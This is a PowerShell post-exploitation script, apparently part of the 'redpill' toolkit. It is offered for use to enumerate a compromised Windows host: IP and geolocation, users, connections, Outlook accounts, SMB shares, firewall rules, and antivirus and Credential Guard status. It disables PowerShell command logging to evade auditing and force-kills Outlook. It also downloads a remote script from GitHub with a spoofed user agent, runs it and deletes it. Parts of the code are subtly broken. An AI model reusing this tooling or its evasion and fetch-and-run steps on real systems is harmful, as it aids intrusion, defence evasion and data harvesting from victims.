<#
.SYNOPSIS
   Enumerates remote host basic\verbose system info

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: none
   Optional Dependencies: curl, icacls
   PS cmdlet Dev version: v1.4.14

.DESCRIPTION
   System info: IpAddress, OsVersion, OsFlavor, OsArchitecture,
   WorkingDirectory, CurrentShellPrivileges, ListAllDrivesAvailable
   PSCommandLogging, AntiVirusDefinitions, AntiSpywearDefinitions,
   UACsettings, WorkingDirectoryDACL, BehaviorMonitorEnabled, Etc..

.NOTES
   Optional dependencies: curl (geolocation) icacls (file permissions)
   -HideMyAss "True" - Its used to hide the public ip address display!
   If sellected -sysinfo "verbose" then established & listening connections
   will be listed insted of list only the established connections (TCP|IPV4)

.Parameter Sysinfo
  Accepts arguments: Enum, Verbose (default: Enum)

.Parameter HideMyAss
  Accepts arguments: True, False (default: False)

.EXAMPLE
   PS C:\> Get-Help .\SysInfo.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\SysInfo.ps1 -SysInfo Enum
   Remote Host Quick Enumeration Module

.EXAMPLE
   PS C:\> .\SysInfo.ps1 -SysInfo Enum -HideMyAss True
   Remote Host Quick Enumeration + hide public ip addr

.EXAMPLE
   PS C:\> .\SysInfo.ps1 -SysInfo Verbose
   Remote Host Detailed Enumeration Module

.OUTPUTS
   PublicIP    city  region country  capital latitude longitude
   --------    ----  ------ -------  ------- -------- ---------
   3.382.13.77 Alges Lisbon Portugal Lisbon  38.7019  -9.2243

   Proto LocalAddress  LocalPort RemoteAdress    RemotePort ProcessName PID
   ----- ------------- --------- --------------- ---------- ----------- ---
   TCP   192.168.1.72  55062     35.165.138.131  443        firefox     8904
   TCP   192.168.1.72  55102     140.82.112.25   443        firefox     8904
   TCP   192.168.1.72  55846     51.138.106.75   443        svchost     1636
   TCP   192.168.1.72  55847     34.117.59.81    80         powershell  1808
   TCP   192.168.1.72  60406     20.54.37.64     443        svchost     8352
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$HideMyAss="false",
   [string]$SysInfo="false"
)


$Address = (## Get Local IpAddress
    Get-NetIPConfiguration | Where-Object {
        $_.IPv4DefaultGateway -ne $null -and
        $_.NetAdapter.status -ne "Disconnected"
    }
).IPv4Address.IPAddress


Write-Host ""
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$Working_Directory = pwd|Select-Object -ExpandProperty Path
If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){

    ## Local Function Variable declarations
    $ConsoleId = (Get-Process -PID $PID).Id
    $PsNumber = $PSVersionTable.PSVersion.ToString()
    $PSExecPolicy = Get-ExecutionPolicy -Scope CurrentUser
    $IsVirtualMachine = (Get-MpComputerStatus).IsVirtualMachine
    $System = (Get-CimInstance -ClassName CIM_OperatingSystem).Caption
    $Version = (Get-CimInstance -ClassName CIM_OperatingSystem).Version
    $NameDomain = (Get-CimInstance -ClassName CIM_OperatingSystem).CSName
    $SystemDir = (Get-CimInstance -ClassName CIM_OperatingSystem).SystemDirectory
    $Architecture = (Get-CimInstance -ClassName CIM_OperatingSystem).OSArchitecture
    $RawParse = $PsNumber.Split('.')[-1];$PsNumber = $PsNumber -replace ".${RawParse}",""
    $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
    $UserAgentString = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent' -ErrorAction SilentlyContinue|Select-Object -ExpandProperty 'User Agent'
    If($IsClientAdmin){$ShellPrivs = "Admin"}Else{$ShellPrivs = "UserLand"}

    ## Get default webbrowser
    $RawHKLMkey = "HKCU:\Software\Microsoft\" +
    "Windows\Shell\Associations\UrlAssociations\" + "https\UserChoice" -Join ''
    $DefaultBrowser = (Get-ItemProperty "$RawHKLMkey" -ErrorAction SilentlyContinue).ProgId
    If($DefaultBrowser){## Parsing registry data
        $Parse_Browser_Data = $DefaultBrowser.split("-")[0] -replace 'URL','' -replace 'HTML','' -replace '.HTTPS',''
    }Else{## default webbrowser reg key not found
        $Parse_Browser_Data = "Not Found"
    }

    try{#Get CPU Temp from WMI ThermalZoneInformation
       $IntTemp = Get-WMIObject -Query "SELECT * FROM Win32_PerfFormattedData_Counters_ThermalZoneInformation" -Namespace "root/CIMV2"
       $Temp = @($IntTemp)[0].HighPrecisionTemperature
       $Temp = [math]::round($Temp / 100.0, 1)
    }catch{$Temp = "****"}


    ## Build OutPut Table
    Write-Host "OS: $System " -ForegroundColor Green
    Write-Host "------------------------------";Start-Sleep -Seconds 1
    Write-Host "DomainName        : $NameDomain\$Env:USERNAME"
    Write-Host "ShellPrivs        : $ShellPrivs" -ForegroundColor Yellow
    If($Temp -lt "37")
    {
       Write-Host "CPU Temp          : $Temp ºC" -ForegroundColor Green
    }
    ElseIf($Temp -gt "37" -and $Temp -lt "65")
    {
       Write-Host "CPU Temp          : $Temp ºC" -ForegroundColor Yellow -BackgroundColor Gray
    }
    ElseIf($Temp -gt "65")
    {
       Write-Host "CPU Temp          : $Temp ºC" -ForegroundColor Red -BackgroundColor Gray
    }
    ElseIf($Temp -eq "****")
    {
       Write-Host "CPU Temp          : $Temp ºC" -ForegroundColor Red -BackgroundColor Gray
    }
    Write-Host "ConsolePid        : $ConsoleId"
    Write-Host "IsVirtualMachine  : $IsVirtualMachine"
    Write-Host "Architecture      : $Architecture"
    Write-Host "PSVersion         : $PsNumber" -ForegroundColor Yellow
    Write-Host "PSExecPolicy      : $PSExecPolicy"
    Write-Host "OSVersion         : $Version"
    Write-Host "IPAddress         : $Address" -ForegroundColor Yellow
    Write-Host "System32          : $SystemDir"
    Write-Host "DefaultWebBrowser : $Parse_Browser_Data (predefined)"
    Write-Host "CmdLetWorkingDir  : $Working_Directory" -ForegroundColor Yellow
    Write-Host "User-Agent        : $UserAgentString`n"


    ## Get network adapter settings!
    If(-not($HideMyAss -ieq "True")){## Default enumeration!
       $AdaptTable = Get-NetAdapter -EA SilentlyContinue |
          Select-Object Name,Status,LinkSpeed,MacAddress
    }Else{## Hide mac address sellected by user!
       $AdaptTable = Get-NetAdapter -EA SilentlyContinue |
          Select-Object Name,Status,LinkSpeed,DriverFileName
    }

    ## Colorize output DataTable strings!
    $AdaptTable | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {
       $stringformat = If($_ -iMatch 'Up' -and $_ -iMatch '(\s+Mbps\s+|\s+bps\s+)'){
          @{ 'ForegroundColor' = 'Yellow' } }Else{ @{ 'ForegroundColor' = 'White' } }
       Write-Host @stringformat $_
    }

    #Get Outlook emails
    $ScriptDir = Split-Path -Path $MyInvocation.MyCommand.Definition -Parent
    #Log file creation, similar to $ScriptDir\[SCRIPTNAME]_[YYYY_MM_DD].log
    $SystemTime = Get-Date -uformat %Hh%Mm%Ss
    $SystemDate = Get-Date -uformat %Y.%m.%d
    #$ScriptLogFile = "$ScriptDir\$([System.IO.Path]::GetFileNameWithoutExtension($MyInvocation.MyCommand.Definition))" + "_" + $SystemDate + "_" + $SystemTime + ".log"
    $ScriptLogFile = "$Env:TMP\OutlookEmails.log"

    function Stop-TranscriptOnLog
    {
       Stop-Transcript
       #Add EOL required for Notepad.exe application usage
       [string]::Join("`r`n", (Get-Content $ScriptLogFile)) | Out-File $ScriptLogFile
    }

    #Start of log completion
    Start-Transcript $ScriptLogFile | Out-Null

    #Create Outlook object
    $Outlook = New-Object -ComObject Outlook.Application  
    $accounts = $outlook.session.accounts

    If(-not($accounts) -or $accounts -ieq $null)
    {
       #Check for accounts existence!
       Write-Host "ERROR: none outlook accounts found under $Env:COMPUTERNAME!" -ForegroundColor Red -BackgroundColor Black
       Write-Host ""
    } 

    #Build Output Table!
    $dn = @{label = "Email Address"; expression={$_.displayname}}  
    $un = @{label = "User Name"; expression = {$_.username}}  
    $sm = @{label = "SMTP Address"; expression = {$_.smtpaddress}}

    #Display Output Table! {colorize}
    $accounts | Format-Table -AutoSize $dn,$un,$sm

    #Stop OUTLOOK processes!
    $StopMe = (Get-Process).ProcessName | Where-Object { $_ -iMatch 'Outlook' }
    ForEach($ProcName in $StopMe){Stop-Process -Name $ProcName -Force -EA SilentlyContinue}


    ## Get Public Ip addr GeoLocation
    # Build GeoLocation DataTable!
    $geotable = New-Object System.Data.DataTable
    $geotable.Columns.Add("PublicIP")|Out-Null
    $geotable.Columns.Add("city")|Out-Null
    $geotable.Columns.Add("region")|Out-Null
    $geotable.Columns.Add("country")|Out-Null
    $geotable.Columns.Add("capital")|Out-Null
    $geotable.Columns.Add("latitude")|Out-Null
    $geotable.Columns.Add("longitude")|Out-Null

    try{## Prevent curl fail output displays!
       $PublicAddr = (curl ifconfig.me).Content
    }catch{## [error] curl => failed to retrieve public IP address!
       Write-Host "[curl]: failed to retrieve ${Env:COMPUTERNAME} public IP address!" -ForegroundColor Red -BackgroundColor Black
    }

    ## Get the Public IP address from curl\ipapi.co!
    If($PublicAddr -Match '^(\d+.\d+.\d+.\d+)$'){## Prevent curl fail output displays!
       $GeoLocation = (curl "https://ipapi.co/$PublicAddr/json/" -EA SilentlyContinue).RawContent|
          findstr /C:"city" /C:"region" /C:"country_" /C:"latitude" /C:"longitude"|
          findstr /V "iso3 tld calling area population region_code country_code"
    }

    If($HideMyAss -ieq "True"){$PublicAddr = "HideMyAss"}
    $GeoDate = $GeoLocation -replace '"','' -replace ',','' -replace '(^\s+|\s+$)',''
    $Moreati = $Geodate -replace '(city: |region: |country_name: |country_capital: |latitude: |longitude: )',''
       
       $city = $Moreati[0] -join ''   ## city
       $regi = $Moreati[1] -join ''   ## region
       $cnam = $Moreati[2] -join ''   ## country_name
       $ccap = $Moreati[3] -join ''   ## country_capital
       $lati = $Moreati[4] -join ''   ## latitude
       $long = $Moreati[5] -join ''   ## longitude

    ## Adding values to DataTable!
    $geotable.Rows.Add("$PublicAddr", ## PublicIP
                       "$city",       ## city
                       "$regi",       ## region
                       "$cnam",       ## country_name
                       "$ccap",       ## country_capital
                       "$lati",       ## latitude
                       "$long"        ## longitude
     )|Out-Null
     ## Display DataTable!
     $geotable | Format-Table -AutoSize


     ## Enumerate ESTABLISHED TCP connections!
     #Build TCP connections DataTable!
     $tcptable = New-Object System.Data.DataTable
     $tcptable.Columns.Add("Proto")|Out-Null
     $tcptable.Columns.Add("LocalAddress ")|Out-Null
     $tcptable.Columns.Add("LocalPort")|Out-Null
     $tcptable.Columns.Add("RemoteAdress   ")|Out-Null
     $tcptable.Columns.Add("RemotePort")|Out-Null
     $tcptable.Columns.Add("ProcessName")|Out-Null
     $tcptable.Columns.Add("PID")|Out-Null
     $tcptable.Columns.Add("State")|Out-Null

     ## Get a list of ESTABLISHED TCP connections! { Exclude UDP|IPV6|LocalHost protocols }
     # If used '-sysinfo verbose' then ESTABLISHED and LISTENING connections will be listed!
     If($SysInfo -ieq "verbose"){## Detailed Enumeration function!

        $Filter = "UDP ESTABLISHED LISTENING"
        $Regex = "[ ::"

     }Else{## Default scan settings!

        $Filter = "ESTABLISHED"
        $Regex = "[ :: UDP 0.0.0.0:0 127.0.0.1"

     }

     $TcpList = netstat -ano | findstr "$Filter" | findstr /V "$Regex"
     ForEach($Item in $TcpList){## Loop trougth all $TcpList Items!

        #Split List using the empty spaces betuiwn strings!
        $parse = $Item.split()

        #Delete empty lines from the variable List!
        $viriato = $parse | ? { $_.trim() -ne "" }

        $Protocol = $viriato[0]             ## Protocol
        $AddrPort = $viriato[1]             ## LocalAddress + port
        $LocalHos = $AddrPort.Split(':')[0] ## LocalAddress
        $LocalPor = $AddrPort.Split(':')[1] ## LocalPort
        $ProcPPID = $viriato[-1]            ## Process PID
        $Remoteal = $viriato[2]             ## RemoteAddress + port

        If($Remoteal -iNotMatch '^(LISTENING|ESTABLISHED)$' -or $Remoteal -ne $null)
        {
           $Remotead = $Remoteal.Split(':')[0] ## RemoteAddress
           $Remotepo = $Remoteal.Split(':')[1] ## RemotePort
        }
        Else
        {
           $Remoteal = "";$Remotead = "";$Remotepo = ""
        }


        try{## Get each process name Tag by is PID identifier! {silent}
           $ProcName = (Get-Process -PID "$ProcPPID" -EA SilentlyContinue).ProcessName
        }catch{} ## Catch exeptions - Do Nothing!


        If($Item -iMatch 'ESTABLISHED')
        {
           $portstate = "ESTABLISHED"
        }
        ElseIf($Item -iMatch 'LISTENING')
        {
           $portstate = "LISTENING"
        }

        ## Adding values to output DataTable!
        $tcptable.Rows.Add("$Protocol",   ## Protocol
                           "$LocalHos",   ## LocalAddress
                           "$LocalPor",   ## LocalPort
                           "$Remotead",   ## RemoteAddress
                           "$Remotepo",   ## RemotePort
                           "$ProcName",   ## ProcessName
                           "$ProcPPID",   ## PID
                           "$portstate"   ## state
        )|Out-Null

     }## End of 'ForEach()' loop function!

     ## Diplay TCP connections DataTable!
     # Out-String formats strings containing the ports '20,23,80,107,137' and
     # 'lsass','System', 'wininit' and 'telnet' process names as yellow foregroundcolor!
     $tcptable | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {
        $stringformat = If($_ -Match '(\s+20\s+|\s+80\s+|\s+107\s+|\s+137\s+)' -or
           $_ -iMatch '(\s+ssh\s+|\s+lsass\s+|\s+System\s+|\s+wininit\s+)')
        {
           @{ 'ForegroundColor' = 'Yellow' }
        }
        ElseIf($_ -iMatch '\s+MsMpEng\s+|\s+TeamViewer\s+|\s+Mstsc\s+|\s+ftp\s+|\s+telnet\s+')
        {
           @{ 'ForegroundColor' = 'Red' }
        }
        Else
        {
           @{ 'ForegroundColor' = 'White' }
        }
        Write-Host @stringformat $_
     }


    ## Get ALL User Accounts
    Get-LocalUser -EA SilentlyContinue |
       Select-Object Name,SID,Enabled,PasswordRequired,PasswordLastSet |
       Format-Table -AutoSize | Out-String -Stream | ForEach-Object {
           $stringformat = If($_ -iMatch "${Env:USERNAME}" -and $_ -iMatch 'True'){
              @{ 'ForegroundColor' = 'Yellow' } }Else{ @{ 'ForegroundColor' = 'White' } }
           Write-Host @stringformat $_
        }


    If($SysInfo -ieq "Verbose"){## Detailed Enumeration function

        $Constrained = $ExecutionContext.SessionState.LanguageMode
        If($Constrained -ieq "ConstrainedLanguage"){
            $ConState = "Enabled"
        }Else{## disabled
            $ConState = "Disabled"
        }

        ## Local Function variable declarations
        $PSHistoryStatus = (Get-PSReadlineOption).HistorySavePath
        $AMProductVersion = (Get-MpComputerStatus).AMProductVersion
        $AMServiceEnabled = (Get-MpComputerStatus).AMServiceEnabled
        $AntivirusEnabled = (Get-MpComputerStatus).AntivirusEnabled
        $IsTamperProtected = (Get-MpComputerStatus).IsTamperProtected
        $AntispywareEnabled = (Get-MpComputerStatus).AntispywareEnabled
        $DisableScriptScanning = (Get-MpPreference).DisableScriptScanning
        $SignatureScheduleTime = (Get-MpPreference).SignatureScheduleTime
        $DisableArchiveScanning = (Get-MpPreference).DisableArchiveScanning
        $BehaviorMonitorEnabled = (Get-MpComputerStatus).BehaviorMonitorEnabled
        $RealTimeProtectionEnabled = (Get-MpComputerStatus).RealTimeProtectionEnabled
        $AntivirusSignatureLastUpdated = (Get-MpComputerStatus).AntivirusSignatureLastUpdated
        $AntispywareSignatureLastUpdated = (Get-MpComputerStatus).AntispywareSignatureLastUpdated
        $AntiVirusProduct = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct).DisplayName
        $ScanScheduleTime = Get-MpPreference | Select-Object ScanScheduleTime | findstr /V "ScanScheduleTime ---" | Where-Object { $_ -ne "" }
        $ScanScheduleQuickScanTime = Get-MpPreference | Select-Object ScanScheduleQuickScanTime | findstr /V "ScanScheduleQuickScanTime ---" | Where-Object { $_ -ne "" }

        <#
        .NOTES
          MyMeterpreter.ps1 Disables PS Command Logging in current session
          (while this terminal console is open). The next variable declaration
          displays to CmdLet users if the setting has sucessfuly modified ...
          Remark: PSCommandLogging will be restarted to default at CmdLet exit.
        #> $PSLoggingSession = (Get-PSReadlineOption).HistorySaveStyle #<--

        ## Get UAC settings {Notify Me, Never Notify, Allways Notify }
        # Credits: https://winaero.com/how-to-change-uac-settings-in-windows-10/
        $RawPolicyKey = "HKLM:\Software\Microsoft\" + "Windows\CurrentVersion\" + "policies\system" -Join ''
        $UacStatus = (Get-Itemproperty -path "$RawPolicyKey").EnableLUA
        $ConsentPromptBehaviorAdmin = (Get-Itemproperty -path "$RawPolicyKey").ConsentPromptBehaviorAdmin
        $ConsentPromptBehaviorUser = (Get-Itemproperty -path "$RawPolicyKey").ConsentPromptBehaviorUser

        ## Parsing UAC Registry Data
        If($ConsentPromptBehaviorAdmin -ieq "5" -and $ConsentPromptBehaviorUser -ieq "3"){
            $UacSettings = "Notify Me" ## Defaul value
        }ElseIf($ConsentPromptBehaviorAdmin -ieq "0" -and $ConsentPromptBehaviorUser -ieq "0"){
            $UacSettings = "Never Notify"
        }ElseIf($ConsentPromptBehaviorAdmin -ieq "2" -and $ConsentPromptBehaviorUser -ieq "3"){
            $UacSettings = "Allways Notify"
        }Else{## Can NOT retrive reg value
            $UacSettings = "`$null"
        }

        If($UacStatus -ieq "0"){## disabled
            $UacStatus = "False"
        }ElseIf($UacStatus -ieq "1"){## enabled
            $UacStatus = "True"
        }Else{## Can NOT retrive reg value
            $UacStatus = "`$null"
        }

        ## Get Credentials from Credential Guard
        If($OsVersion.Major -ge 10){## Not Supported on Windows >= 10
            $RegPath = "HKEY_LOCAL_MACHINE\" + "System\CurrentControlSet\" + "Control\LSA" -Join ''
            $Result = Get-ItemProperty -Path "Registry::$($RegPath)" -EA SilentlyContinue -ErrorVariable GetItemPropertyError
            If(-not($GetItemPropertyError)){
                If(-not($Null -eq $Result.LsaCfgFlags)){
                    If($Result.LsaCfgFlags -eq 0){
                        $Status = "disabled"
                        $Description = "Credential Guard is disabled!"
                    }ElseIf($Result.LsaCfgFlags -eq 1){
                        $Status = "enabled"
                        $Description = "Credential Guard is enabled with UEFI lock!"
                }ElseIf($Result.LsaCfgFlags -eq 2){
                    $Status = "enabled"
                    $Description = "Credential Guard is enabled without UEFI lock!"
                } 
            }Else{
                $Status = "disabled"
                $Description = "Credential Guard is not configured!"
            }
        }
    }Else{
        $Status = "disabled"
        $Description = "Credential Guard is not supported on this OS!"
    }


   ## Built Output Table
   Write-Host "Default AV: $AntiVirusProduct"  -ForegroundColor Green
   Write-Host "------------------------------";Start-Sleep -Seconds 1
   Write-Host "UACEnabled                      : $UacStatus"
   Write-Host "UACSettings                     : $UacSettings"
   Write-Host "AMProductVersion                : $AMProductVersion"
   Write-Host "AMServiceEnabled                : $AMServiceEnabled"
   Write-Host "AntivirusEnabled                : $AntivirusEnabled" -ForegroundColor Yellow
   Write-Host "IsTamperProtected               : $IsTamperProtected"
   Write-Host "AntispywareEnabled              : $AntispywareEnabled"
   Write-Host "DisableScriptScanning           : $DisableScriptScanning"
   Write-Host "BehaviorMonitorEnabled          : $BehaviorMonitorEnabled"
   Write-Host "RealTimeProtectionEnabled       : $RealTimeProtectionEnabled" -ForegroundColor Yellow
   Write-Host "ConstrainedLanguage             : $ConState"
   Write-Host "SignatureScheduleTime           : $SignatureScheduleTime"
   Write-Host "AntivirusSignatureLastUpdated   : $AntivirusSignatureLastUpdated"
   Write-Host "AntispywareSignatureLastUpdated : $AntispywareSignatureLastUpdated"
   Write-Host "PowerShellCommandLogging        : $PSLoggingSession"  -ForegroundColor Yellow
   Write-Host "DisableArchiveScanning          : $DisableArchiveScanning"
   Write-Host "ScanScheduleTime                : $ScanScheduleTime"
   Write-Host "ScanScheduleQuickScanTime       : $ScanScheduleQuickScanTime"


   ## Built Output Table
   Write-Host "`n`nAV: Credential Guard Status"
   Write-Host "------------------------------";Start-Sleep -Seconds 1
   write-host "Name        : Credential Guard"
   write-host "Status      : $Status" -ForegroundColor Yellow
   write-host "Description : $Description"


   ## GetCounterMeasures - Enumerate Anti-Virus process's running!
   If(-not(Test-Path -Path "$Env:TMP\GetCounterMeasures.ps1" -EA SilentlyContinue))
   {
      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetCounterMeasures.ps1" -OutFile "$Env:TMP\GetCounterMeasures.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
   }

   &"$Env:TMP\GetCounterMeasures.ps1" -Action Enum
   Remove-Item -Path "$Env:TMP\GetCounterMeasures.ps1" -Force


   ## Enumerate active SMB shares
   Write-Host "SMB: Enumerating shares"
   Write-Host "------------------------------";Start-Sleep -Seconds 1
   Get-SmbShare -EA SilentlyContinue|Select-Object Name,Path,Description|Format-Table
   If(-not($?)){## Make sure we have any results back
       Write-Host "[error] None SMB shares found under $Env:COMPUTERNAME system!" -ForegroundColor Red -BackgroundColor Black
   }


   ## Enumerate NetBIOS Local Names
   Write-Host "`n`nNetBIOS: Names       Type        Status"
   Write-Host "-------------------------------------------"
   nbtstat -n|Select-String -Pattern "<??>" >> $Env:TMP\NBNT.mt
   $NetBiosData = Get-Content -Path "$Env:TMP\NBNT.mt"|findstr "<"
   $DisplayData = $NetBiosData -replace '(^\s+|\s+$)','' ## Delete Empty spaces in beggining and End of string
   If(-not($NetBiosData) -or $NetBiosData -ieq $null){   ## Make sure we have any results back
       If(Test-Path -Path "$Env:TMP\NBNT.mt"){Remove-Item -Path "$Env:TMP\NBNT.mt" -Force}
           Write-Host "[error] None NetBIOS Local Names found! {Table}" -ForegroundColor Red -BackgroundColor Black      
       }Else{
           echo $DisplayData
           If(Test-Path -Path "$Env:TMP\NBNT.mt"){Remove-Item -Path "$Env:TMP\NBNT.mt" -Force}
       }


       ## Checks for remote host Firewall rules!
       Get-NetFirewallRule | Where-Object {## Filter rules by { Enabled,Profile,Description } Objects!
          $_.Enabled -iMatch 'True' -and $_.Profile -iNotMatch '(Private|Domain)' -and $_.Description -ne $null -and
          $_.Description -iNotMatch '({|}|erro|error|router|Multicast|WFD|UDP|IPv6|^@Firewall)' -and $_.Description.Length -lt 42
       } | Format-Table Action,Enabled,Profile,Description -AutoSize | Out-File -FilePath "$Env:TMP\ksjjhav.log" -Force

       $CheckLog = Get-Content -Path "$Env:TMP\ksjjhav.log" -EA SilentlyContinue |
          Where-Object { $_ -ne "" } ## Remove Empty Lines from output!
       Remove-Item -Path "$Env:TMP\ksjjhav.log" -Force
       If($CheckLog -ne $null){## none firewall rules found!
           Write-Host "`n`nGet: Firewall rules (Public|Any)" -ForegroundColor Green
           Start-Sleep -Milliseconds 1300;echo $CheckLog
       }


       ## @Webserver Working dir ACL Description
       Write-Host "`n`nDCALC: CmdLet Working Directory"
       Write-Host "-------------------------------";Start-Sleep -Seconds 1
       $GetACLDescription = icacls "$Working_Directory"|findstr /V "processing"
       echo $GetACLDescription > $Env:TMP\ACl.log;Get-Content -Path "$Env:TMP\ACL.log"
       Remove-Item -Path "$Env:TMP\ACl.log" -Force

       ## TobeContinued ..

   }
   Write-Host "`n";Start-Sleep -Seconds 1
}